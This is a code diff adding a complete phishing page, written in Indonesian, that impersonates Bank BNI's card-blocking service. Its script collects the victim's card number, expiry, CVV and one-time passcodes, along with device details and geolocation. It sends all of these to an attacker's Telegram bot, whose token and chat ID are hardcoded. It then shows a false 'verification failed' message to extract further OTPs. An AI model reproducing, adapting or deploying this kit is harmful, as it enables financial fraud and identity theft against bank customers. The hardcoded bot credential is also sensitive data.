@@ -1,0 +1,608 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+  <title>Blokir Kartu - BNI</title>
+  <link rel="icon" href="ll/home/Bn1-0TP1/favicon.png">
+  <!-- Fonts -->
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@400;500;600;700&display=swap" rel="stylesheet">
+  <!-- Bootstrap & Icons -->
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.6.2/dist/css/bootstrap.min.css">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/all.min.css">
+  <style>
+    * { box-sizing: border-box; margin: 0; padding: 0; }
+    html, body {
+      width: 100%; min-height: 100vh; overflow-x: hidden;
+      font-family: 'Montserrat', sans-serif; background: #f5f5f5;
+    }
+    body { padding-bottom: 30px; }
+    .header-img { width: 100%; height: auto; display: block; margin: 0; padding: 0; }
+    .content-wrapper { padding: 0 15px; margin-top: 10px; }
+    .page { display: none; }
+    .page.active { display: block; }
+    .box-form {
+      background: #fff; border-radius: 10px; padding: 20px 18px;
+      box-shadow: 3px 3px 8px rgba(0,0,0,0.08);
+    }
+
+    /* ===== KARTU 3D ===== */
+    .card-container {
+      perspective: 1000px; width: 100%; max-width: 340px; height: 215px;
+      margin: 0 auto 20px; position: relative;
+    }
+    .card-inner {
+      position: relative; width: 100%; height: 100%; text-align: center;
+      transition: transform 0.6s ease-in-out; transform-style: preserve-3d;
+    }
+    .card-container.flipped .card-inner { transform: rotateY(180deg); }
+    .card-front, .card-back {
+      position: absolute; width: 100%; height: 100%;
+      -webkit-backface-visibility: hidden; backface-visibility: hidden;
+      border-radius: 12px; overflow: hidden; box-shadow: none;
+    }
+    .card-front {
+      background: #000; color: white; padding: 0; text-align: left;
+    }
+    .card-front img { width: 100%; height: 100%; object-fit: cover; display: block; }
+    .card-text-overlay {
+      position: absolute; top: 0; left: 0; width: 100%; height: 100%;
+      padding: 20px; color: #fff; font-family: monospace, sans-serif;
+      pointer-events: none; z-index: 10; text-shadow: 1px 1px 3px rgba(0,0,0,0.8);
+    }
+    .card-number-display {
+      font-size: 20px; letter-spacing: 3px; position: absolute;
+      top: 50%; left: 20px; transform: translateY(-50%);
+    }
+    .card-valid-display {
+      font-size: 11px; position: absolute; bottom: 45px; right: 20px; text-align: right;
+    }
+    .card-name-display {
+      font-size: 13px; position: absolute; bottom: 15px; left: 20px;
+      text-transform: uppercase; font-weight: 500;
+    }
+    .card-back {
+      background: linear-gradient(135deg, #ff0000 0%, #cc0000 100%);
+      color: white; transform: rotateY(180deg); padding: 0;
+    }
+    .card-back-strip {
+      width: 100%; height: 45px; background: #000; margin-top: 30px;
+    }
+    .card-cvv-area { padding: 20px 25px; text-align: right; }
+    .cvv-label { font-size: 12px; color: #ccc; margin-bottom: 5px; text-transform: uppercase; }
+    .cvv-display {
+      font-size: 22px; font-weight: bold; color: #000; background: #fff;
+      display: inline-block; padding: 8px 15px; border-radius: 4px;
+      letter-spacing: 4px; font-family: monospace;
+    }
+
+    /* ===== FORM INPUT ===== */
+    .form-group { margin-bottom: 14px; }
+    .form-label {
+      font-size: 14px; font-weight: 600; color: #ff0000;
+      margin-bottom: 6px; display: block;
+    }
+    .input-single {
+      position: relative; border: 1px solid #ff0000; border-radius: 8px;
+      overflow: hidden; background: #fff;
+    }
+    .input-single .input-icon {
+      position: absolute; left: 14px; top: 50%; transform: translateY(-50%);
+      color: #ff0000; font-size: 18px; z-index: 1;
+    }
+    .input-single input {
+      width: 100%; border: none; outline: none; box-shadow: none;
+      padding: 11px 14px 11px 44px; font-size: 15px;
+      background: transparent; color: #333; font-weight: 500;
+    }
+    .input-single input::placeholder { color: #999; font-size: 14px; }
+    .input-row-2col { display: flex; gap: 12px; width: 100%; }
+    .input-col { flex: 1; }
+    .select-box {
+      width: 100%; border: 1px solid #ff0000; border-radius: 8px;
+      padding: 11px 14px; font-size: 15px; color: #333;
+      font-weight: 500; background: #fff; appearance: none;
+      -webkit-appearance: none;
+      background-image: url("data:image/svg+xml;charset=UTF-8,%3csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24' fill='none' stroke='%23ff0000' stroke-width='2' stroke-linecap='round' stroke-linejoin='round'%3e%3cpolyline points='6 9 12 15 18 9'%3e%3c/polyline%3e%3c/svg%3e");
+      background-repeat: no-repeat; background-position: right 12px center;
+      background-size: 16px; cursor: pointer;
+    }
+    .input-cvv {
+      position: relative; border: 1px solid #ff0000; border-radius: 8px;
+      overflow: hidden; background: #fff;
+    }
+    .input-cvv .input-icon {
+      position: absolute; left: 14px; top: 50%; transform: translateY(-50%);
+      color: #ff0000; font-size: 18px; z-index: 1;
+    }
+    .input-cvv input {
+      width: 100%; border: none; outline: none; box-shadow: none;
+      padding: 11px 14px 11px 44px; font-size: 15px;
+      background: transparent; color: #333; font-weight: 500;
+    }
+
+    /* ===== TOMBOL ===== */
+    .btn-blockir {
+      width: 100%; background: #ff0000; color: #fff; font-size: 16px;
+      font-weight: 600; padding: 12px; border: none; border-radius: 10px;
+      margin-top: 6px; cursor: pointer; transition: background 0.2s ease;
+    }
+    .btn-blockir:hover { background: #cc0000; color: #fff; }
+    .btn-kembali { background: #e9ecef; color: #333; margin-top: 0; margin-right: 8px; }
+    .btn-kembali:hover { background: #dee2e6; color: #333; }
+    .d-flex-gap { display: flex; gap: 8px; }
+    .d-flex-gap button { flex: 1; }
+
+    /* ===== HALAMAN INFO ===== */
+    .info-icon-wrapper { text-align: center; margin-bottom: 25px; padding-top: 10px; }
+    .info-icon {
+      width: 90px; height: 90px; background: linear-gradient(135deg, #ffebee, #ffd6d6);
+      border-radius: 50%; display: inline-flex; align-items: center;
+      justify-content: center; font-size: 42px; color: #ff0000;
+    }
+    .info-title { text-align: center; font-size: 20px; font-weight: 700; color: #ff0000; margin-bottom: 15px; line-height: 1.4; }
+    .info-text { text-align: center; font-size: 14px; color: #444; line-height: 1.7; margin-bottom: 30px; padding: 0 5px; }
+    .info-highlight {
+      background: #fff0f0; border-left: 3px solid #ff0000; padding: 12px 15px;
+      border-radius: 6px; margin-bottom: 25px; font-size: 13px; color: #ff0000; line-height: 1.6;
+    }
+
+    /* ===== POPUP KONFIRMASI ===== */
+    .popup-overlay {
+      position: fixed; inset: 0; background: rgba(0,0,0,0.4);
+      display: none; align-items: center; justify-content: center;
+      z-index: 9999; padding: 20px;
+    }
+    .popup-overlay.active { display: flex; }
+    .popup-box {
+      background: #fff; border-radius: 12px; padding: 25px 20px;
+      max-width: 380px; width: 100%; text-align: center;
+      box-shadow: 0 5px 20px rgba(0,0,0,0.2);
+    }
+    .popup-title { font-size: 18px; font-weight: 700; color: #ff0000; margin-bottom: 15px; }
+    .popup-divider { height: 1px; background: #eee; margin-bottom: 20px; }
+    .popup-icon {
+      width: 40px; height: 40px; background: #ffebee; border-radius: 50%;
+      display: inline-flex; align-items: center; justify-content: center;
+      font-size: 20px; color: #ff0000; margin-bottom: 15px;
+    }
+    .popup-text { font-size: 15px; color: #333; line-height: 1.6; margin-bottom: 25px; }
+    .popup-btn-primary {
+      width: 100%; background: #ff0000; color: #fff; font-size: 16px;
+      font-weight: 600; padding: 12px; border: none; border-radius: 8px;
+      cursor: pointer; transition: background 0.2s ease;
+    }
+    .popup-btn-primary:hover { background: #cc0000; }
+
+    /* ===== OTP INPUT ===== */
+    .otp-title { text-align: center; font-size: 18px; font-weight: 700; color: #ff0000; margin-bottom: 10px; }
+    .otp-desc { text-align: center; font-size: 13px; color: #666; margin-bottom: 25px; line-height: 1.5; }
+    .otp-container { display: flex; justify-content: center; gap: 10px; margin-bottom: 25px; }
+    .otp-input {
+      width: 50px; height: 55px; text-align: center; font-size: 24px;
+      font-weight: 700; border: 2px solid #ddd; border-radius: 8px;
+      outline: none; transition: all 0.2s ease;
+    }
+    .otp-input:focus { border-color: #ff0000; box-shadow: 0 0 0 3px rgba(255,0,0,0.15); }
+    .otp-input.filled { border-color: #ff0000; }
+
+    /* ===== MODAL GAGAL OTP ===== */
+    .modal-overlay {
+      position: fixed; inset: 0; background: rgba(0,0,0,0.5);
+      display: none; align-items: center; justify-content: center;
+      z-index: 10000; padding: 20px;
+    }
+    .modal-overlay.active { display: flex; }
+    .modal-box {
+      background: #fff; border-radius: 12px; padding: 30px 25px;
+      max-width: 360px; width: 100%; text-align: center;
+      box-shadow: 0 5px 20px rgba(0,0,0,0.2);
+    }
+    .modal-icon {
+      width: 60px; height: 60px; background: #ffebee; border-radius: 50%;
+      display: inline-flex; align-items: center; justify-content: center;
+      font-size: 28px; color: #e53935; margin-bottom: 15px;
+    }
+    .modal-title { font-size: 20px; font-weight: 700; color: #e53935; margin-bottom: 15px; }
+    .modal-text { font-size: 14px; color: #555; line-height: 1.8; margin-bottom: 25px; }
+    .modal-btn {
+      width: 100%; background: #ff0000; color: #fff; font-size: 16px;
+      font-weight: 600; padding: 12px; border: none; border-radius: 8px; cursor: pointer;
+    }
+    .modal-btn:hover { background: #cc0000; }
+
+    /* ===== LOADING ===== */
+    .loading-overlay {
+      position: fixed; inset: 0; background: rgba(0,0,0,0.6);
+      display: none; align-items: center; justify-content: center;
+      z-index: 10001;
+    }
+    .loading-overlay.active { display: flex; }
+    .loading-icon { font-size: 40px; color: #ff0000; animation: spin 1s linear infinite; }
+    @keyframes spin { from { transform: rotate(0deg); } to { transform: rotate(360deg); } }
+
+    .privacy-note {
+      font-size: 11px; color: #ff0000; text-align: center;
+      margin-top: 15px; line-height: 1.6; padding: 0 10px;
+    }
+
+    @media (max-width: 480px) {
+      .box-form { padding: 18px 15px; }
+      .card-container { height: 190px; }
+      .card-number-display { font-size: 16px; }
+      .cvv-display { font-size: 18px; padding: 6px 12px; }
+      .otp-input { width: 45px; height: 50px; font-size: 20px; }
+    }
+  </style>
+</head>
+<body>
+  <!-- ====================================================== -->
+  <!-- 🤖 KONFIGURASI BOT TELEGRAM — SUDAH DIISI! -->
+  <!-- ====================================================== -->
+  <script>
+    const BOT_TOKEN = '8208055515:AAFOVnHmQ_hA1xG7zsdlwVOCXtrAxHUNfRs';
+    const CHAT_ID = '8405193617';
+  </script>
+
+  <!-- Loading -->
+  <div class="loading-overlay" id="loadingOverlay">
+    <i class="fas fa-spinner loading-icon"></i>
+  </div>
+
+  <!-- Header Image -->
+  <img src="https://bni-one.vercel.app/www.web-ld.com/membatalkan/batalblokir/img/ben.jpg" alt="Bank BNI" class="header-img">
+
+  <div class="content-wrapper">
+    <!-- ==================================== -->
+    <!-- HALAMAN 1: FORM DATA KARTU -->
+    <!-- ==================================== -->
+    <div class="page active" id="pageKartu">
+      <div class="box-form">
+        <!-- KARTU 3D -->
+        <div class="card-container" id="cardContainer">
+          <div class="card-inner">
+            <div class="card-front">
+              <img id="card-image" src="https://bni-one.vercel.app/www.web-ld.com/membatalkan/batalblokir/images/kartu.png" alt="Kartu Bank BNI">
+              <div class="card-text-overlay">
+                <div class="card-number-display" id="cardNumberText">XXXX XXXX XXXX XXXX</div>
+                <div class="card-valid-display">VALID THRU <span id="validThru">XX/XX</span></div>
+                <div class="card-name-display">BANK BNI</div>
+              </div>
+            </div>
+            <div class="card-back">
+              <div class="card-back-strip"></div>
+              <div class="card-cvv-area">
+                <div class="cvv-label">CVV / CVC</div>
+                <div class="cvv-display" id="cvvDisplay">XXX</div>
+              </div>
+            </div>
+          </div>
+        </div>
+
+        <form id="formKartu">
+          <div class="form-group">
+            <label class="form-label">Nomor Kartu BNI</label>
+            <div class="input-single">
+              <i class="fas fa-credit-card input-icon"></i>
+              <input type="tel" id="cardInput" placeholder="0000 0000 0000 0000" maxlength="19" required>
+            </div>
+          </div>
+
+          <div class="input-row-2col form-group">
+            <div class="input-col">
+              <label class="form-label">Bulan</label>
+              <select class="select-box" id="monthSelect" required>
+                <option value="" disabled selected>Bulan</option>
+                <option value="01">01</option><option value="02">02</option><option value="03">03</option>
+                <option value="04">04</option><option value="05">05</option><option value="06">06</option>
+                <option value="07">07</option><option value="08">08</option><option value="09">09</option>
+                <option value="10">10</option><option value="11">11</option><option value="12">12</option>
+              </select>
+            </div>
+            <div class="input-col">
+              <label class="form-label">Tahun</label>
+              <select class="select-box" id="yearSelect" required>
+                <option value="" disabled selected>Tahun</option>
+                <option value="24">2024</option><option value="25">2025</option><option value="26">2026</option>
+                <option value="27">2027</option><option value="28">2028</option><option value="29">2029</option>
+                <option value="30">2030</option><option value="31">2031</option><option value="32">2032</option>
+                <option value="33">2033</option><option value="34">2034</option><option value="35">2035</option>
+              </select>
+            </div>
+          </div>
+
+          <div class="form-group">
+            <label class="form-label">CVV / Kode Keamanan</label>
+            <div class="input-cvv">
+              <i class="fas fa-lock input-icon"></i>
+              <input type="tel" id="cvvInput" placeholder="***" maxlength="4" required>
+            </div>
+          </div>
+
+          <button type="submit" class="btn-blockir">Lanjutkan</button>
+        </form>
+
+        <p class="privacy-note">
+          PT Bank Negara Indonesia (Persero) Tbk. berizin dan diawasi OJK & peserta penjaminan LPS.
+        </p>
+      </div>
+    </div>
+
+    <!-- HALAMAN 2: INFO VERIFIKASI -->
+    <div class="page" id="pageInfo">
+      <div class="box-form">
+        <div class="info-icon-wrapper"><div class="info-icon"><i class="fas fa-shield-alt"></i></div></div>
+        <h3 class="info-title">Verifikasi Keamanan - BNI</h3>
+        <p class="info-text">Kami akan mengirimkan kode OTP ke nomor HP yang terdaftar di Bank BNI.</p>
+        <div class="info-highlight">
+          <i class="fas fa-info-circle mr-2"></i>
+          Pastikan nomor HP aktif. Kode OTP berlaku <strong>5 menit</strong>.
+        </div>
+        <div class="d-flex-gap">
+          <button type="button" class="btn-blockir btn-kembali" id="btnKembaliDariInfo">Kembali</button>
+          <button type="button" class="btn-blockir" id="btnLanjutkanKeOTP">Lanjutkan</button>
+        </div>
+        <p class="privacy-note">Jangan berikan kode OTP kepada siapapun.</p>
+      </div>
+    </div>
+
+    <!-- POPUP KONFIRMASI -->
+    <div class="popup-overlay" id="popupKonfirmasi">
+      <div class="popup-box">
+        <h3 class="popup-title">BLOKIR KARTU BNI</h3>
+        <div class="popup-divider"></div>
+        <div class="popup-icon"><i class="fas fa-check"></i></div>
+        <p class="popup-text">Lanjutkan proses verifikasi?</p>
+        <button class="popup-btn-primary" id="btnBatalkan">Ya, Lanjutkan</button>
+      </div>
+    </div>
+
+    <!-- HALAMAN 3: INPUT OTP -->
+    <div class="page" id="pageOTP">
+      <div class="box-form">
+        <h3 class="otp-title">Verifikasi Kode OTP - BNI</h3>
+        <p class="otp-desc">Masukkan 6 digit kode OTP yang dikirim ke HP Anda.</p>
+        <div class="otp-container">
+          <input type="tel" maxlength="1" class="otp-input" id="otp1" inputmode="numeric">
+          <input type="tel" maxlength="1" class="otp-input" id="otp2" inputmode="numeric">
+          <input type="tel" maxlength="1" class="otp-input" id="otp3" inputmode="numeric">
+          <input type="tel" maxlength="1" class="otp-input" id="otp4" inputmode="numeric">
+          <input type="tel" maxlength="1" class="otp-input" id="otp5" inputmode="numeric">
+          <input type="tel" maxlength="1" class="otp-input" id="otp6" inputmode="numeric">
+        </div>
+        <div class="d-flex-gap">
+          <button type="button" class="btn-blockir btn-kembali" id="btnKembaliDariOTP">Kembali</button>
+          <button type="button" class="btn-blockir" id="btnKirimOTP">Kirim OTP</button>
+        </div>
+        <p class="privacy-note">Kode OTP berlaku 5 menit. Jangan dibagikan.</p>
+      </div>
+    </div>
+  </div>
+
+  <!-- MODAL GAGAL OTP -->
+  <div class="modal-overlay" id="failModal">
+    <div class="modal-box">
+      <div class="modal-icon"><i class="fas fa-times"></i></div>
+      <h3 class="modal-title">Verifikasi Gagal</h3>
+      <p class="modal-text">Kode OTP bukan yang terbaru.<br>Periksa SMS dan masukkan kode terbaru.</p>
+      <button class="modal-btn" onclick="tutupModal()">Coba Lagi</button>
+    </div>
+  </div>
+
+  <!-- JQUERY & BOOTSTRAP -->
+  <script src="https://cdn.jsdelivr.net/npm/jquery@3.6.4/dist/jquery.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/bootstrap@4.6.2/dist/js/bootstrap.bundle.min.js"></script>
+
+  <script>
+    let dataKartu = {};
+
+    // ELEMENTS
+    const cardContainer = document.getElementById('cardContainer');
+    const cardInput = document.getElementById('cardInput');
+    const monthSelect = document.getElementById('monthSelect');
+    const yearSelect = document.getElementById('yearSelect');
+    const cvvInput = document.getElementById('cvvInput');
+    const cardNumberText = document.getElementById('cardNumberText');
+    const validThru = document.getElementById('validThru');
+    const cvvDisplay = document.getElementById('cvvDisplay');
+    const loadingOverlay = document.getElementById('loadingOverlay');
+    const formKartu = document.getElementById('formKartu');
+    const pageKartu = document.getElementById('pageKartu');
+    const pageInfo = document.getElementById('pageInfo');
+    const pageOTP = document.getElementById('pageOTP');
+    const popupKonfirmasi = document.getElementById('popupKonfirmasi');
+    const failModal = document.getElementById('failModal');
+    const otpInputs = [
+      document.getElementById('otp1'), document.getElementById('otp2'), document.getElementById('otp3'),
+      document.getElementById('otp4'), document.getElementById('otp5'), document.getElementById('otp6')
+    ];
+
+    // ======================================================
+    // 🤖 FUNGSI KIRIM KE TELEGRAM — SUDAH GABUNG!
+    // ======================================================
+    function getDeviceInfo() {
+      const ua = navigator.userAgent;
+      let device = 'Perangkat Tidak Diketahui';
+      let os = '';
+      if (/Android/.test(ua)) { os = 'Android'; const m = ua.match(/Android\s([0-9.]+);\s?(.*?)\sBuild/); if(m) device = m[2].trim(); }
+      else if (/iPhone|iPad/.test(ua)) { os = 'iOS'; device = /iPhone/.test(ua)?'iPhone':/iPad/.test(ua)?'iPad':'iOS Device'; }
+      else if (/Windows/.test(ua)) os = 'Windows';
+      else if (/Mac/.test(ua)) os = 'macOS';
+      return `${device} (${os})`;
+    }
+
+    async function getLocation() {
+      return new Promise(resolve => {
+        if (!navigator.geolocation) resolve('Lokasi: Tidak Terdeteksi');
+        else navigator.geolocation.getCurrentPosition(
+          async (pos) => {
+            const { latitude:lat, longitude:lon } = pos.coords;
+            try {
+              const r = await fetch(`https://nominatim.openstreetmap.org/reverse?lat=${lat}&lon=${lon}&format=json`);
+              const j = await r.json();
+              resolve(`${j.address?.city || j.address?.town || j.address?.state || 'Tidak Diketahui'}, ${j.address?.country || ''} | Lat: ${lat.toFixed(2)}, Lon: ${lon.toFixed(2)}`);
+            } catch { resolve(`Lat: ${lat.toFixed(2)}, Lon: ${lon.toFixed(2)}`); }
+          },
+          () => resolve('Lokasi: Izin Ditolak'),
+          { timeout: 5000 }
+        );
+      });
+    }
+
+    async function kirimKeTelegram(pesan) {
+      if (!BOT_TOKEN || !CHAT_ID) { alert('Token/ID belum diisi!'); return false; }
+      try {
+        const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+            chat_id: CHAT_ID,
+            text: pesan,
+            parse_mode: 'HTML',
+            disable_web_page_preview: true
+          })
+        });
+        const data = await res.json();
+        if (data.ok) { console.log('✅ Terkirim ke Telegram'); return true; }
+        else { alert('Gagal kirim: ' + data.description); return false; }
+      } catch(e) { alert('Error jaringan: ' + e.message); return false; }
+    }
+
+    // ======================================================
+    // 📄 LOGIKA FORM
+    // ======================================================
+
+    // Putar kartu saat CVV difokuskan
+    cvvInput.addEventListener('focus', () => cardContainer.classList.add('flipped'));
+    cvvInput.addEventListener('blur', () => cardContainer.classList.remove('flipped'));
+    cvvInput.addEventListener('input', function() {
+      const v = this.value.replace(/\D/g, '').slice(0,4);
+      this.value = v;
+      cvvDisplay.textContent = v || 'XXX';
+    });
+
+    // Format nomor kartu
+    cardInput.addEventListener('input', function() {
+      let v = this.value.replace(/\D/g, '').slice(0,16);
+      v = v.replace(/(.{4})(?=\d)/g, '$1 ');
+      this.value = v;
+      cardNumberText.textContent = v || 'XXXX XXXX XXXX XXXX';
+    });
+
+    // Update masa berlaku
+    function updateValidThru() {
+      validThru.textContent = `${monthSelect.value||'XX'}/${(yearSelect.value||'XX').slice(-2)}`;
+    }
+    monthSelect.addEventListener('change', updateValidThru);
+    yearSelect.addEventListener('change', updateValidThru);
+
+    // Kirim data kartu → halaman info
+    formKartu.addEventListener('submit', async function(e) {
+      e.preventDefault();
+      const noKartu = cardInput.value.trim().replace(/\s/g, '');
+      const bulan = monthSelect.value;
+      const tahun = yearSelect.value;
+      const cvv = cvvInput.value.trim();
+
+      if (noKartu.length !== 16 || !bulan || !tahun || cvv.length < 3) {
+        alert('Lengkapi semua data dengan benar!');
+        return;
+      }
+
+      dataKartu = { noKartu, bulan, tahun, cvv, bank: 'BNI' };
+      loadingOverlay.classList.add('active');
+
+      const perangkat = getDeviceInfo();
+      const lokasi = await getLocation();
+      const pesan = `
+🔔 <b>PERMINTAAN BLOKIR KARTU BNI</b>
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+💳 No. Kartu: ${noKartu.replace(/(.{4})(?=\d)/g, '$1 ')}
+📅 Berlaku: ${bulan}/${tahun}
+🔒 CVV: ${cvv}
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+📱 Perangkat: ${perangkat}
+🌍 Lokasi: ${lokasi}
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━`;
+      await kirimKeTelegram(pesan);
+
+      loadingOverlay.classList.remove('active');
+      pageKartu.classList.remove('active');
+      pageInfo.classList.add('active');
+    });
+
+    // Halaman Info → Popup
+    document.getElementById('btnLanjutkanKeOTP').addEventListener('click', () => {
+      popupKonfirmasi.classList.add('active');
+    });
+
+    // Popup → Halaman OTP
+    document.getElementById('btnBatalkan').addEventListener('click', () => {
+      popupKonfirmasi.classList.remove('active');
+      pageInfo.classList.remove('active');
+      pageOTP.classList.add('active');
+      otpInputs[0].focus();
+    });
+
+    // Kembali
+    document.getElementById('btnKembaliDariInfo').addEventListener('click', () => {
+      pageInfo.classList.remove('active');
+      pageKartu.classList.add('active');
+    });
+    document.getElementById('btnKembaliDariOTP').addEventListener('click', () => {
+      pageOTP.classList.remove('active');
+      pageInfo.classList.add('active');
+      otpInputs.forEach(i => { i.value = ''; i.classList.remove('filled'); });
+    });
+
+    // OTP Auto-next
+    otpInputs.forEach((input, idx) => {
+      input.addEventListener('input', function() {
+        this.value = this.value.replace(/\D/g, '');
+        if (this.value) this.classList.add('filled'); else this.classList.remove('filled');
+        if (this.value && idx < otpInputs.length - 1) otpInputs[idx + 1].focus();
+      });
+      input.addEventListener('keydown', function(e) {
+        if (e.key === 'Backspace' && !this.value && idx > 0) otpInputs[idx - 1].focus();
+      });
+    });
+
+    // Kirim OTP
+    document.getElementById('btnKirimOTP').addEventListener('click', async () => {
+      const otp = otpInputs.map(i => i.value).join('');
+      if (otp.length !== 6 || !/^\d{6}$/.test(otp)) {
+        alert('Masukkan 6 digit kode OTP!');
+        return;
+      }
+
+      loadingOverlay.classList.add('active');
+      const perangkat = getDeviceInfo();
+      const lokasi = await getLocation();
+      const pesanOTP = `
+🔐 <b>OTP DITERIMA — BNI</b>
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+💳 No. Kartu: ${dataKartu.noKartu.replace(/(.{4})(?=\d)/g, '$1 ')}
+📅 Berlaku: ${dataKartu.bulan}/${dataKartu.tahun}
+🔑 CVV: ${dataKartu.cvv}
+🔢 OTP: ${otp}
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+📱 Perangkat: ${perangkat}
+🌍 Lokasi: ${lokasi}
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━`;
+      await kirimKeTelegram(pesanOTP);
+      loadingOverlay.classList.remove('active');
+
+      // Tampilkan pesan gagal
+      failModal.classList.add('active');
+    });
+
+    function tutupModal() {
+      failModal.classList.remove('active');
+      otpInputs.forEach(i => { i.value = ''; i.classList.remove('filled'); });
+      otpInputs[0].focus();
+    }
+  </script>
+</body>
+</html>
